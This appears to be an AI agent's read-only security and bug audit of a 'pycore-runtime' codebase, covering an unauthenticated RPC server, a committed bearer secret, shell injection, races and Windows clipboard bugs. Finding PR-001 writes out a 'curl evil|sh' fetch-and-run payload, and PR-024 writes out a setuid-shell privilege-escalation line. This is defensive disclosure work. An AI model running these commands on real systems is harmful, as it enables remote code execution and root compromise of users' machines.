# pycore-runtime bug audit — 2026-09-27

Role: pycore-runtime (prefix PR). Report only; no code, config, docs or tests were changed.
Method: I read the code statically and followed each finding through its real call chain. I ran only read-only checks that write nothing (grep, AST parsing, `ls`/`stat`, and one `node -e` evaluation of `path.win32.join`), and ran no project code, tests, builds or services.

**Warning — code changed during the audit.** Delivery-layer files in this scope were edited while I read them (02:17–02:43 local time) by the user's separate session (W4/W8 delivery work):
- `pyutils/laravel/delivery_outbox.py`
- `pyctl/agent_history/pipeline/delivery.py`
- the new `pyctl/laravel/delivery_service.py`
- `callmodule/rpc_routes/local_task_center_routes.py`
- `pyctl/audio_orchestration/orch_delivery.py` (edited again up to 02:38; audio-tts scope)
- `database/repositories/laravel_delivery_repository.py` (edited at 02:36)
- `pyutils/laravel/client.py` (edited at 02:24)
- `pyutils/laravel/endpoint_manager.py` (edited at 02:17)

At 02:46 I re-read every file in scope modified after 02:10. Only findings that still hold are listed, and those touching such files carry `[in-flight, last read 02:46]`. Mid-edit breakage that had been fixed by then is listed under `## In-flight observations`, not as bugs.

**Counts:**
- Pass 1: critical 1, high 5, medium 11, low 9 (26 findings). PR-002 is withdrawn; see In-flight observations.
- Pass 2 (Addendum, PR-030 to PR-037): high 2, medium 5, low 1.
- Total: critical 1, high 7, medium 16, low 10 (34 findings).

---

## Findings

### PR-001 — The pycore RPC server (0.0.0.0:59000) has no authentication and allows any CORS origin with credentials, so any LAN host or any web page in the user's browser can drive terminals (remote code execution).
- severity: critical · category: security · confidence: confirmed
- location: `pycore/pyutils/rpc_v2/server.py:99` (`allow_origins` default `["*"]`), `:111-117` (CORSMiddleware with `allow_credentials=True`), `:77-83` (adds `access-control-allow-private-network: true` to every response), `pycore/pythreadpool/starters.py:141,158-166` (starts `HttpServerRunner` with host `0.0.0.0` and no `allow_origins`)
- failure scenario: pyservice starts pycore on `0.0.0.0:59000` (`pyservice.ps1:41,473`; `pycore_module_caller.py` default `HTTP_BIND_HOST` = `hosts.any` = `0.0.0.0`).
  1. The attacker calls `POST http://<victim>:59000/api/ui/terminal/windows` to list window ids.
  2. The attacker calls `POST /api/ui/terminal/input?window_id=x11:0x…&terminal_number=1` with a `text/plain` body `curl evil|sh`.
  3. pycore pastes the text into the user's terminal and presses Enter (`terminal_service.input_text` → `paste_and_submit`).

  A `text/plain` POST is a CORS "simple request", so a web page can send it with no preflight. `decode_request_params` turns a text/plain body into `params["text"]` (`execution.py:84-86`).

  The same surface also exposes:
  - codesync peer/settings routes;
  - agent-history prompts;
  - terminal screenshots;
  - user data.
- evidence:
  - `pycore_module_caller.py:124` → `callmodule/config.py:215-265` builds `rpc_v2` options with no `allow_origins`. The call then goes through `starters.py:158` → `HttpServerRunner(host=host, …)` → `HttpServer(options)`, where the default `self.allow_origins = list(server_options.get("allow_origins", ["*"]))` applies.
  - No authentication check exists anywhere in `server.py`, `dispatcher.py` or `execution.py`: `dispatch_route` (`server.py:330-365`) dispatches any registered route.
  - The restricted `CallmoduleConfig.CORS_ALLOW_ORIGINS` (`pyctl/runtime/callmodule_config.py:142`) is used only by the legacy `callmodule_main.py:133` entry.
- suggested fix: Bind the UI surface to loopback, or require a per-install bearer token or signed header on every non-relay route. Restrict CORS to the dashboard origins and drop `allow_credentials` and the private-network header for foreign origins.

### PR-003 — CodeSync workspace auth is a fixed bearer secret committed to the repo, which gives any LAN peer read/write access to every workspace file (write → code execution).
- severity: high · category: security · confidence: confirmed
- location: `pycore/pyutils/codesync/workspace_auth.py:9-11`; routes at `pycore/callmodule/rpc_routes/code_sync_routes.py:128-200` (`workspace_read_file` / `workspace_write_file` / `write_workspace_document`)
- failure scenario: The secret `cncs_6d7d…cf29` is in source, and the repo is public (the extension metadata URL points to GitHub). An attacker on the LAN sends `Authorization: Bearer cncs_…` to the workspace write route on `0.0.0.0:59000`. That overwrites any file under `sync_target_root()` (the repo in client mode), such as `pyservice.sh` or a pycore module, and it runs on the next restart or hot reload. `resolve_contained_path` stops `../` escapes but not writes inside the repo.
- evidence: `WORKSPACE_AUTHENTICATOR = StaticBearerAuthenticator(WORKSPACE_SHARED_SECRET, …)` is the only gate. `service.py:304` → `get_workspace_exchange(manager.sync_target_root())`.
- suggested fix: Generate a per-install secret stored outside the repo (APP_CONFIG_DIR, mode 0600) or pair devices explicitly. Never commit it.

### PR-004 — `Commander` joins list commands with spaces and runs them through `shell=True`, which breaks paths with spaces and lets shell metacharacters run (injection).
- severity: high · category: security · confidence: confirmed
- location: `pycore/pyfoundations/pybasecommon/commander.py:132-141` (`_prepare_command`: `" ".join(str(cmd) for cmd in command)`), `:143-177` (`_create_process` `shell=True`), `:480-535` (`run_background` `shell=True`)
- failure scenario: Concrete callers:
  - `secret_manager.py:192` runs `exec_silent(['node', file, 'pwd', password, raw_dir])`. A password containing `;`, `&`, `$()`, a space or quotes gets split or executed by `/bin/bash` or `cmd.exe`. Decryption fails or arbitrary commands run, and the password is visible in the shell command line.
  - `launcher/background_runner.py:79` runs `run_background([python_exe, caller_script])`. A Python install or repo path with spaces (for example `C:\Program Files\Python310\pythonw.exe`) makes launcher option [2]/[3] fail to start pycore.
  - `ensure_library/ffmpeg_installer.py:227` runs `[seven_zip_path, 'x', archive, f'-o{extract_to}', '-y']`. The fallback path `C:\Program Files\7-Zip\7z.exe` (line 206) always contains a space, so Windows FFmpeg extraction always fails.
- evidence: `exec_silent` → `exec_realtime` → `_prepare_command` → `_create_process(command_str)` with `shell=True`; the list items are never quoted.
- suggested fix: Pass list commands to `subprocess.Popen(list, shell=False)`. Keep `shell=True` only for explicit string commands.

### PR-005 — Terminal text input is not serialized: an RPC input and a scheduled input running at the same time swap clipboard contents and focus, so one prompt is pasted and submitted (Enter) into the wrong terminal.
- severity: high · category: race · confidence: likely
- location: `pycore/pyctl/terminal/terminal_service.py:208-265` (`input_text`); callers `callmodule/rpc_routes/terminal_routes.py:125-133` (each RPC runs on its own `RpcRouteThread` via `await_bus_task`, `rpc_v2/execution.py:49-53`) and `pyctl/terminal/terminal_scheduler.py:47-58,103-109` (`TerminalSchedulerThread` → `submit_scheduled` → `input_text`)
- failure scenario: The UI submits text A to terminal 1 while a schedule fires text B for terminal 2.
  1. Thread A sets the clipboard to A.
  2. Thread B backs up the clipboard (it saves A) and sets it to B.
  3. Thread A activates terminal 1 and sends Shift+Insert (or Ctrl+V), so B is pasted into terminal 1 and Enter is pressed.
  4. Thread B restores A and the user's real clipboard is lost.

  The pointer and focus actions of the two flows also interleave.
- evidence: `TerminalService` has no serialized owner or lock. The clipboard and the input focus are process-wide resources.
- suggested fix: Run all input/enter/scroll/activate actions through one serialized owner (a single-flight `TerminalInputThread`), shared by the RPC routes and the scheduler.

### PR-006 — Windows clipboard write calls Win32 through ctypes without `restype`/`argtypes`, so 64-bit pointers are truncated and `set_clipboard_text` raises an access-violation `OSError`.
- severity: high · category: windows-compat · confidence: likely
- location: `pycore/pyutils/common/clipboard_text.py:32-57` (`_set_with_winapi`)
- failure scenario: On 64-bit CPython (high-entropy ASLR), `GlobalAlloc`/`GlobalLock` return pointers above 4 GB. The default `c_int` restype truncates them, so `ctypes.memmove(locked, …)` writes to an invalid address and ctypes raises `OSError: exception: access violation writing 0x…`. `_write_selection` uses `any(...)`, so the exception propagates and the pyperclip and PowerShell fallbacks never run.

  For terminal input: `terminal_service.input_text:229` calls `clipboard_manager.set_text`, which raises before the `try`. The RPC fails and the pending submission log (`begin_submission`, status `pending`) is never completed. Every Windows terminal paste and clipboard copy is affected.
- evidence: No `kernel32.GlobalAlloc.restype = ctypes.c_void_p` / `GlobalLock.restype` / `SetClipboardData.argtypes` anywhere in the file. The same pattern was a known pyperclip crash.
- suggested fix: Declare `restype`/`argtypes` (`c_void_p`/`HANDLE`) for GlobalAlloc, GlobalLock, GlobalUnlock, GlobalFree, OpenClipboard and SetClipboardData, and check each result.

### PR-021 — `thread_bus/trigger_event` lets any HTTP client fire any internal THREAD_BUS event with any payload (exit, restart, service install/remove, Laravel online edge). `[in-flight, last read 02:46]`
- severity: high · category: security · confidence: confirmed
- location: `pycore/callmodule/rpc_routes/thread_bus_routes.py:39-51`
- failure scenario: The route is exposed with the same missing authentication as PR-001.
  - `POST /api/thread_bus/trigger_event {"event_name":"tray_action_exit"}` shuts pycore down. `"app.restart"` / `"tray_action_restart"` restart it (`pythreadpool/starters.py:97`, `pyctl/runtime/event_handlers.py:386-387`).
  - `"tray_action_toggle_service"` installs or removes the Linux system units.
  - `"laravel.endpoint.online_edge"` with a forged `{base_url, namespace, previous_namespace}` makes the delivery outbox adopt one namespace's rows into another (`pyutils/laravel/delivery_outbox.py:1239-1259` `_on_laravel_online` → `_adopt`). It then reconciles and uploads the local inventory to an attacker-chosen base URL.

  The handler runs synchronously on the RPC thread (no `async_mode`).
- evidence: `THREAD_BUS.trigger_event(event_name, event_data)` with no allowlist.
- suggested fix: Replace it with an explicit allowlist of UI-originated event names, validate each payload, and require the same authentication as PR-001.

### PR-007 — `exec_silent` ignores `timeout`/`capture_output` kwargs, and `exec_realtime` reads stdout fully before stderr, which can deadlock.
- severity: medium · category: hang · confidence: confirmed
- location: `pycore/pyfoundations/pybasecommon/commander.py:303-328` (kwargs dropped), `:207-230` (sequential `readline` on stdout, then `stderr.read()`)
- failure scenario:
  - Callers such as `process_manager.py:129,164`, `secret_manager.py:192`, `flutter_dev_tools/utils/port_manager.py:281` and `launcher/device_sync/*` pass `timeout=…`. A hung child blocks the calling thread forever.
  - A child that writes more than about 64 KB to stderr while keeping stdout open (pip, apt, ffmpeg) fills the stderr pipe and blocks. The parent waits on `stdout.readline()`, so both hang.
- evidence: `return Commander.exec_realtime(command, info, cwd, show_output=False)` — kwargs unused. `process.stderr.read()` only after the stdout loop.
- suggested fix: Implement `timeout` with `subprocess.run(..., timeout=)` or `communicate()`, and drain stderr concurrently (for example `stderr=STDOUT` or `communicate`).

### PR-008 — `TerminalSchedulerThread` has no exception guard; any exception during a dispatch kills the thread and all later schedules silently stop.
- severity: medium · category: thread-death · confidence: confirmed
- location: `pycore/pyctl/terminal/terminal_scheduler.py:47-66`
- failure scenario: `execute_dispatch` → `input_text` raises, for example the Windows clipboard `OSError` (PR-006), a jeepney `ConnectionResetError` after the session bus restarts, or an Xlib `ConnectionClosedError`. `run()` ends, no wake-up ever dispatches again, and the claimed entry keeps its `dispatch_token` with no completion until pycore restarts.
- evidence: The `while True` loop has no try/except. `claim_due` → `execute_dispatch` → `complete_dispatch` → `report_dispatch`.
- suggested fix: Catch per-dispatch failures, complete the dispatch as failed, and keep the loop alive.

### PR-009 — The worker result poster opens a global 30 s "retry-after" window after any failed POST (including a single-shot progress ping); terminal results posted in that window are dropped with no retry and no deferral.
- severity: medium · category: data-loss · confidence: confirmed
- location: `pycore/pyutils/laravel/worker_result_delivery.py:80-82` (early `return False`), `:199-207` (sets `worker._result_retry_after` on 5xx or a transport error)
- failure scenario:
  1. The translation worker sends `_post_result(task_id, "processing", attempts=1)` (`handlers/ai_translate.py:63`) during a brief network blip, which sets `_result_retry_after = now+30`.
  2. The AI translation finishes about 10 s later and `_post_result(task_id, "completed", result=…)` returns False immediately. The early return skips `diff_task_segment_store.defer(...)` (lines 237-242), and the handlers ignore the return value.
  3. The paid AI result is thrown away. The task stays assigned in Laravel until its lease timeout and is then processed again.
- evidence: Callers in `pyctl/translation/worker/handlers/*.py` never check the return. The window applies across all tasks of the worker.
- suggested fix: Apply the backoff only to best-effort progress pings, or queue terminal results durably (the outbox) instead of returning False.

### PR-010 — `LaravelEndpointManager.resolve()` writes `_resolved` from caller threads and never invalidates it on failure: the user's endpoint selection can be overwritten by a stale probe, and a failover winner stays forever. `[in-flight, last read 02:46]`
- severity: medium · category: race · confidence: likely
- location: `pycore/pyutils/laravel/endpoint_manager.py:595-668` (`resolve`, not serialized, sets `self._resolved` at `:641` and `:655`), `:724-727` (`invalidate`, called only from add/remove/select); rechecked after the file's 02:17 edit
- failure scenario:
  - (a) A worker thread is in `resolve()` probing stored endpoint A (up to 2×12 s). The user selects B, so `select` → `invalidate` → `_finish_select` → `_mark_resolved(B)`. The probe of A then finishes and runs `self._resolved = A`. Every `get_active_base_url()` caller (workers, outbox, relay) keeps using A until the next manual select.
  - (b) The stored endpoint is briefly down, the sweep picks C and caches it. C later goes offline, but `resolve()` returns C forever (`if self._resolved: return self._resolved`). Nothing calls `invalidate()` on failure (no external callers), so traffic never returns to the recovered stored endpoint.
- evidence: `grep laravel_endpoint_manager.invalidate` finds no callers. `laravel_reachability.note(False)` does not clear `_resolved`.
- suggested fix: Tag each resolve with a selection generation and apply `_resolved` only when the generation is unchanged. Clear `_resolved` on the offline edge of the resolved URL.

### PR-011 — `X11Display._open()` never tries a connection without a cookie, so X servers reachable without an Xauthority file (xhost / Xvfb / root with `xhost +SI:localuser:root`) are reported as unavailable. `[in-flight, last read 02:52]`
- severity: medium · category: correctness · confidence: confirmed
- location: `pycore/pyutils/common/x11_display.py:326-354`
- failure scenario: DISPLAY=:0 is set, XAUTHORITY is unset, and there is no cookie in the runtime dir or home (a root service with an xhost grant, Xvfb, `startx -nolisten tcp` without auth). `sources` is empty, the loop body never runs, and the function returns `X11_ERROR_CONNECT_FAILED`. Terminal control, launcher terminal counting (`launch_guard._count_linux_terminals`, `launch_guard.py:278-287`, which was edited at 02:50) and window placement all fall back or fail, although `Xlib.display.Display(':0')` would connect.
- evidence: `sources = dict.fromkeys(path for path in (...) if path and Path(path).is_file())`; there is no attempt without a cookie. The function also leaves `os.environ["XAUTHORITY"]` set to the last failing candidate, a process-wide mutation that races other threads.
- suggested fix: Try one connection without a cookie (unset XAUTHORITY) when no candidate works, and scope the XAUTHORITY override to the connect call.

### PR-012 — On a Windows console restart, `pyservice.ps1` kills the dashboard UI server because the successor process is not listening yet when the parent exits.
- severity: medium · category: lifecycle · confidence: likely
- location: `pycore/pyutils/common/process_restart.py:95-114` (console handoff, then `os._exit(3)`); `pyservice.ps1` `finally` block (tail of the file: checks `Get-NetTCPConnection -LocalPort $Port -State Listen`)
- failure scenario:
  1. A tray or hot-reload restart spawns the successor and the parent immediately exits with code 3.
  2. The successor first waits for the parent to exit (`wait_for_restart_parent`) and then imports all of pycore before binding :59000, which takes seconds.
  3. `& $py.Path @pyArgs` returns right away, the `finally` finds no listener, and it runs `taskkill /PID $uiProc.Id /T /F`. The dashboard (npm/node) dies on every restart, and the console prompt returns while the successor keeps writing into it.

  `pycore_module_caller.py:137-140` says exit code 3 makes pyservice skip teardown, but `pyservice.ps1` never reads `$LASTEXITCODE`.
- evidence: See the lines above. `pyservice.ps1` checks only the listener.
- suggested fix: In `pyservice.ps1`, treat `$LASTEXITCODE -eq 3` as "handoff, keep the UI server", or wait with a bounded poll for the successor listener.

### PR-013 — The agent-history planner and worker save a full stale config snapshot, which reverts user changes made during planning (for example turning the pipeline off). `[in-flight, last read 02:46]`
- severity: medium · category: race · confidence: likely
- location: `pycore/pyctl/agent_history/pipeline/planner.py:124-165` (`cfg = get_config()` … `collect_fragments(tool)` for every tool … `save_config(cfg)`); also `pipeline/worker.py:175-177,183-186,198-213`
- failure scenario:
  1. The heartbeat planner reads the config, then scans the history of every enabled tool (seconds).
  2. Meanwhile the user turns `enabled` off, changes `enabled_tools`, or edits a prompt template.
  3. `save_config(cfg)` passes the whole old dict as the patch. `_save_config_owned` copies every `USER_CONFIG_KEYS` value from it, so the user's change is reverted and broadcast as `AGENT_HISTORY_CONFIG_CHANGED`. With `enabled=True` in the stale dict it also re-forces `extract_as_article`/`live_listen`/`phase`.
- evidence: `config.py:161-206` — the serialized owner serializes only the write, not the read-modify-write. The planner saves only when `config_changed` (new tool lanes or a flushed live set), which is common.
- suggested fix: Save only the cursor keys the planner and worker own (`cursors`, `live_cursors`, `live_completed`, `backfill_targets`, `last_tool`, `cursor`), not the whole config.

### PR-022 — `FileLockManager` does not give mutual exclusion, either between processes or between threads.
- severity: medium · category: race · confidence: confirmed
- location: `pycore/pyfoundations/file_lock.py:279-346` (`_acquire_lock`), `:241-261` (`_check_self_deadlock`), `:146` (`self._current_lock_file` per instance)
- failure scenario:
  - (a) Two processes: both scan, both see no active lock, and each creates its own `{ts}.{pid}.lck`. Both return "Lock acquired" and write the JSON concurrently, so updates are lost.
  - (b) Two threads of one process (the same manager): thread A holds `{ts}.{pid}.lck`. Thread B sees a lock with its own PID, treats it as a "self-deadlock", deletes it and acquires, so both are in the critical section. B also overwrites `self._current_lock_file`, so A's release deletes B's lock.

  The consumer is `pyfoundations/split_file_store.py` (the edge TTS translator store). Every acquire also prints four log lines (`ColorPrint.plain`, not behind `verbose`).
- evidence: There is no `O_CREAT|O_EXCL` on one shared name and no check after creating the file. A lock file with the current PID is always unlinked.
- suggested fix: Use an OS lock (`fcntl.flock` / `msvcrt.locking`) on one lock file, or `os.open(O_CREAT|O_EXCL)` on a single name, plus a per-instance thread-safe owner.

### PR-024 — The launcher's grid shell rc file is world-writable and is sourced by root terminals, so any local user can run code as root. Settings and prompt files are also world-writable.
- severity: medium · category: security · confidence: confirmed
- location:
  - `pycore/pyutils/launcher/linux_terminal_launcher.py:114-125` (writes `TMP_DIR/pylauncher-grid.rc`, `os.chmod(rc_path, 0o666)`, then `exec bash --rcfile <rc> -i`);
  - `pycore/pyutils/common/user_data_store.py:138-142` (`user_data.json` → `0o666`);
  - `pycore/pyctl/agent_history/prompt_archive.py:35` (`0o666`);
  - `pyfoundations/core_node_dirs.py:127-135`, `app_config_path.py:11-18`, `system_paths.py:280-288` (runtime dirs `0o1777`).
- failure scenario: The grid launcher runs as root under pkexec (the file's own comment says so). Any local user appends `cp /bin/bash /tmp/r; chmod 4755 /tmp/r` to `/var/_core_node/_tmp/pylauncher-grid.rc`, and the next grid launch runs it in every root grid shell.

  On this host the file is `-rw-rw-rw-` and `/var/_core_node/_tmp` is `drwxrwxrwx`, with no sticky bit, so the file can also be deleted or replaced. The same exposure lets any local user edit `user_data.json` (Laravel endpoints, codesync peers, AI settings), for example to redirect the signed Laravel traffic to their own server.
- evidence: `ls -l /var/_core_node/_tmp/pylauncher-grid.rc` shows `-rw-rw-rw-`, and `ls -ld /var/_core_node/_tmp` shows `drwxrwxrwx`. The rc path is quoted into `exec bash --rcfile`.
- suggested fix: Write the rc file per UID (`$XDG_RUNTIME_DIR` or `/run/user/<uid>`, mode 0600, owned by the running user) or pass `--rcfile` from a read-only repo path. Keep settings files 0600/0644, not 0666.

### PR-026 — Hot reload (on by default) restarts pycore in a loop while any watched file has a future mtime, and CodeSync writes received files with the peer's mtime.
- severity: medium · category: restart-loop · confidence: confirmed
- location: `pycore/pyutils/common/dev_reload.py:117-123` (baseline drops `mtime > PROCESS_IMAGE_STARTED_NS`), `:133-160`; trigger `pycore/pyutils/codesync/push_receiver.py:725-731` (`os.utime(target, (server_mtime, server_mtime))`)
- failure scenario:
  1. A codesync peer whose clock is 10 minutes ahead pushes `pycore/x.py`, and the receiver stamps it with the peer's mtime (now + 10 min).
  2. The watcher sees "modified" and restarts via `os.execv`.
  3. The new image sets `PROCESS_IMAGE_STARTED_NS = now`, the baseline filter drops `x.py` because its mtime is in the future, and the first scan reports it as "added" and restarts again.

  pycore restarts every ~1–2 s until the wall clock passes that mtime. Each restart kills in-flight deliveries, terminal input and relay operations. Any file with a future timestamp (archive extraction, a skewed NFS/SMB mount) does the same.
- evidence: `baseline = {path: mtime ... if mtime <= PROCESS_IMAGE_STARTED_NS}` then `_changes(baseline, _snapshot(roots))`. Hot reload is the default (`pyservice.ps1:474` passes `--no-reload` only on opt-out).
- suggested fix: Keep future-mtime files in the baseline (or clamp them to the start time), and make codesync keep the local write time or clamp `server_mtime` to now.

### PR-027 — The root agent-history spool exposes other human users' private agent sessions to the desktop worker user.
- severity: medium · category: security · confidence: likely
- location: `pycore/pyctl/agent_history/root_spool.py:196-222` (`_spoolable_sources` over `scan_user_homes()`), `:170-189` (spool root:<worker gid> 0750/0640); `pycore/pyfoundations/agent_home_scanner.py:120-154`
- failure scenario: On a multi-user Linux host, the root helper (run as root beside the worker) walks every human home from `agent_history_users_roots()` (`/home/*` accounts plus `/root`). It keeps exactly the files the worker **cannot** read (another user's `~/.claude/projects/*.jsonl`, codex/kimi sessions, mode 0600), parses them, and writes the sessions and prompts into a spool the worker's group can read. The desktop user (and any member of its primary group) can then read other users' private prompts, which often contain pasted secrets.

  The module docstring states the intent as root-owned sessions only ("claudeteam / kimi1 / kimi2 … started as root"), but nothing restricts it to `st_uid == 0` or to configured slot users.
- evidence: `if not stat.S_ISREG(...) or st.st_nlink != 1 or access.can_read(path, st): continue` is the only filter. There is no owner check.
- suggested fix: Spool only files owned by root (or an explicit allowlist of slot accounts), and use a spool group that contains only the worker user.

### PR-014 — The pycore identity signature hashes `str(dict)` for form or multipart bodies, so the signed content digest never matches the bytes actually sent. `[in-flight, last read 02:46]`
- severity: low · category: contract · confidence: confirmed (latent)
- location: `pycore/pyutils/laravel/client.py:275-292` (rechecked after the file's 02:24 edit)
- failure scenario: `laravel_client.post(path, data={...})` (for example the `tts/laravel_audio_worker_execution.py:288` failure report) or any `files=` upload signs `sha256(str(data))`. Laravel's `RelayDeviceIdentity::verify` compares against `sha256($request->getContent())`, so `PycoreClientOnly` rejects the request. Today only `internal/pycore/logs/latest` (GET) is gated, so it is latent. Moving any form or multipart route behind `pycore.client` breaks it.
- evidence: `identity_body = request_data if bytes else str(request_data).encode()`; Laravel side is `poly_apps/laravel_main/app/Services/Relay/RelayDeviceIdentity.php:51`.
- suggested fix: Sign after encoding: build the request with `httpx.Request`/`requests.PreparedRequest` and hash the prepared body.

### PR-015 — The XDG portal client caches one session-bus connection forever and leaks match rules.
- severity: low · category: resilience · confidence: likely
- location: `pycore/pyutils/common/xdg_desktop_portal.py:308-311` (`_ensure_connection` only checks None), `:326-333` (`add_match` without RemoveMatch per request)
- failure scenario: After the user logs out and back in, or the session bus restarts, `self._connection` is dead. Every portal call raises (`ConnectionResetError`/`OSError` from jeepney) until pycore restarts, and Wayland input/capture through the portal stays broken. Each `_request` adds a bus match rule that is never removed.
- evidence: There is no reset path. `call_method` does not catch transport errors.
- suggested fix: Drop and reopen the connection on transport errors, and remove the match rule after each request.

### PR-016 — `xauthority_candidates` crashes with `FileNotFoundError` when a cookie file disappears between `glob` and `getmtime`.
- severity: low · category: crash · confidence: likely
- location: `pycore/pyfoundations/desktop_session.py:149`
- failure scenario: A mutter Xwayland auth file (`.mutter-Xwaylandauth.*`) is rotated or removed during a re-login. `sorted(..., key=os.path.getmtime)` raises, and every `x11_display._open` and `_resolve_xauthority` call errors.
- evidence: `sorted(set(candidates), key=os.path.getmtime, reverse=True)`.
- suggested fix: Stat each candidate defensively and skip files that disappeared.

### PR-017 — The Windows clipboard PowerShell fallback garbles non-ASCII text.
- severity: low · category: windows-compat · confidence: likely
- location: `pycore/pyutils/common/clipboard_text.py:60-78`
- failure scenario: When pyperclip is missing, `Get-Clipboard -Raw` output is decoded as UTF-8 by `run_args`, but PowerShell 5 writes redirected stdout in the OEM code page (cp936/cp437). `Set-Clipboard` reads stdin with the console input encoding while Python writes UTF-8. Chinese prompts become mojibake in the clipboard, and therefore in the terminal paste.
- evidence: `run_args(... encoding="utf-8")`; no `[Console]::OutputEncoding` / `InputEncoding` set in the script.
- suggested fix: Set `[Console]::InputEncoding/OutputEncoding = [Text.UTF8Encoding]::new($false)` in both scripts.

### PR-018 — Terminal input replaces non-text clipboard content with an empty string.
- severity: low · category: data-loss · confidence: confirmed
- location: `pycore/pyctl/terminal/terminal_service.py:227-250`
- failure scenario: The user has an image or files on the clipboard. `get_text()` returns None, `backup_text` becomes `""`, and after the paste `set_text("")` wipes the clipboard.
- evidence: `backup_text = clipboard_backup if clipboard_backup is not None else ""` and `finally: clipboard_manager.set_text(backup_text)`.
- suggested fix: Skip the restore when the backup was not text, or back up and restore the native clipboard formats.

### PR-019 — `pymain.py` always exits 0, even when the app fails.
- severity: low · category: correctness · confidence: confirmed
- location: `pymain.py:56-67`
- failure scenario: `launcher.start()` returns False or raises. The script prints a traceback but exits 0, so wrappers, systemd units and CI treat the failure as success.
- evidence: `success` is never used, and there is no `sys.exit(1)` in the `except Exception` branch.
- suggested fix: `sys.exit(0 if success else 1)` and exit 1 after the traceback.

### PR-020 — CodeSync runtime re-implements shared primitives (bus tasks, machine id).
- severity: low · category: rule · confidence: confirmed
- location: `pycore/pyutils/codesync/runtime.py:77-140` (own `BusTaskThread`/`start_bus_task`/`_publish_response`), `:335-455` (`_stdlib_machine_id` "Replicates pycore.pyfoundations.machine_id.get_machine_id() exactly")
- failure scenario: A fix to `pyfoundations/serialized_worker.start_bus_task` or `pyfoundations/machine_id` does not reach codesync, so machine ids drift and peers appear duplicated. This is an AGENTS.md "remove duplicate implementations" violation.
- evidence: See the lines above.
- suggested fix: Import the shared `start_bus_task` and machine-id helpers, and keep only the injection hook.

### PR-023 — `pg_sync_adapter` reports a PostgreSQL restore as complete even when psql hit errors, after `--clean` has already dropped the target objects.
- severity: low · category: data-loss · confidence: likely
- location: `pycore/pyfoundations/pg_sync_adapter.py:491-520`
- failure scenario: Without `-v ON_ERROR_STOP=1`, `psql -f dump.sql` returns 0 even when statements fail, so the `rc != 0` branch never runs and the method prints "Restore complete." A `pg_dumpall --clean` script that fails halfway (version mismatch, missing role or extension) leaves the Linux databases dropped or partial while the sync metadata records success.
- evidence: `cmd = [psql_bin, … '-f', str(dump_path)]`; stderr is checked for `ERROR` only when `rc != 0`.
- suggested fix: Run psql with `-v ON_ERROR_STOP=1` (or scan stderr for `ERROR` on rc 0) and mark the sync as failed.

### PR-025 — ncore `SingleInstanceManager`: two instances can both believe they own the lock, and an exiting instance deletes the new owner's lock.
- severity: low · category: race · confidence: likely
- location: `ncore/utils/mcp_server/SingleInstanceManager.js:61-68` (heartbeat 5000 ms, stale threshold 6000 ms), `:136-148` (`updateHeartbeat` rewrites the lock without an owner check), `:199-210` (`releaseLock` unlinks without an owner check)
- failure scenario: The MCP server's event loop blocks for more than about 1 s (a sync fs or JSON call, or GC), so a second instance sees the lock as stale and takes over. The first instance's next heartbeat overwrites the lock with its own PID, both keep serving, and whichever exits first deletes the survivor's lock file.
- evidence: The margin between heartbeat and stale threshold is only 1 s. Neither the write nor the unlink compares `lockData.pid` with `process.pid`.
- suggested fix: Raise the stale threshold well above the heartbeat (for example 3×), and check the owner PID before each heartbeat write and before release.

---

## Cross-scope

These are boundary defects seen while tracing the findings above. I did not audit these areas in depth.

- **laravel-backend** — `poly_apps/laravel_main/routes/api.php:294-300`. `app_qy_v1/media/ingest`, `ingest-clip` and `audio` are marked "local pycore worker, no auth". The queue-center control routes (`queues/{queue}/head`, `tasks/{id}/cancel`, `tasks/{id}/retry`, `:405-418`) are also public. Any LAN client can ingest media, cancel or retry tasks, or reorder queues. This is the Laravel counterpart of PR-001.
- **laravel-backend** — `app/Services/Relay/RelayDeviceIdentity.php:62-69`. The canonical path is `'/'.$request->path()`, which drops the base path, while pycore signs `urlsplit(url).path` (`pyutils/laravel/identity.py:68-70`). Behind a sub-path deployment (for example `https://host/laravel/api/...`) every `pycore.client`-gated call fails. This is latent: only `internal/pycore/logs/latest` is gated today.
- **audio-tts** — `pycore/pyctl/tts/laravel_audio_worker_execution.py:288` sends a form-encoded failure report via `laravel_client.post(data=fields)`. The pycore content digest is wrong for it (PR-014).
- **audio-tts** — the lane workers (`pyctl/tts/laravel_audio_worker*.py`) inherit the global 30 s result window from `worker_result_delivery` (PR-009). The edge TTS translator (`pyutils/tts/edge/translator.py`) is the only consumer of the broken `FileLockManager` (PR-022).
- **shell (infra-shell)** — `scripts/shells/linux/common/pycore_service.sh:237-244`. `uninstall` runs `systemctl stop` before `disable` and `rm`, so an uninstall launched from inside the `pycore` unit kills itself first (pass 2, PR-034).
- **lead / reviewer (contract)** — `pycore/pycore_module_caller.py:133-140` documents "exit 3 → pyservice.ps1/.sh skip UI teardown", but `pyservice.ps1` never reads `$LASTEXITCODE` (PR-012). Decide which side owns this contract.

## In-flight observations

These were seen mid-edit and had been fixed by the 02:46 re-read, so they are not bugs.

- PR-002 (withdrawn). At about 02:15:
  - `DeliveryKind` had no `backfill` field, while `pyctl/agent_history/pipeline/delivery.py` and `pyctl/audio_orchestration/orch_delivery.py` still built `DeliveryKind(backfill=…)` at import. That raised a TypeError in the chain `pycore_module_caller` → `event_handlers` → `heartbeat` → `tick_service`.
  - `laravel_delivery_outbox.backfill()` (called from `local_task_center_routes.py:85` and `pipeline/delivery.py`) did not exist.
  - Nothing called `laravel_delivery_outbox.start()`, so `_begin_drain` never ran.

  Current state at 02:46:
  - `pyctl/runtime/event_handlers.py:37,493` → `pyctl/laravel/delivery_service.py` `start_laravel_delivery()` registers audio_resource, orch and agent-history, then calls `start()`.
  - `grep backfill` finds nothing in the delivery producers.
  - An AST/regex check of every `laravel_delivery_outbox.<attr>`, every `DeliveryKind(...)` kwarg and every repository call in `pycore/` finds no missing name.
  - Every `pycore/**/*.py` parses.
- The delivery outbox and repository gained `replaces` / `rename_kind` / `cached_hash` between 02:25 and 02:36. I did not audit their internals beyond the API check above.

## Reviewer cross-reference

- No PR finding duplicates RV-001, RV-006, RV-008 or RV-009.
- For RV-001, I saw the pycore side in `pyctl/relay/laravel_relay_agent_service.py` `_publish_agent_history_event`: revision = `int(time.time())`, or the first item's `ts`. I agree with it and did not file it separately.
- PR-001, PR-021 and the Laravel cross-scope bullet above (the public media and queue-center routes) are outside the contract checks the reviewer ran. RV-003 (Mercure token on `/overview`) is related but separate.

## Coverage

